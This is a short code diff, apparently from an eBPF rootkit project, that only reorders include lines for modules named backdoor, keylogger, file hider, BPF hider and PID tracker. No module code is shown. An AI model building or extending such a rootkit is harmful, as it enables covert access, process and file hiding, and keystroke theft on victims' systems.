@@ -6,9 +6,9 @@
 
 /* Include each module implementation */
 #include "backdoor.c"
-#include "keylogger.c"
-#include "file_hider.c"
 #include "bpf_hider.c"
+#include "file_hider.c"
+#include "keylogger.c"
 #include "pid_tracker.c"
 
 char _license[] SEC("license") = "GPL";
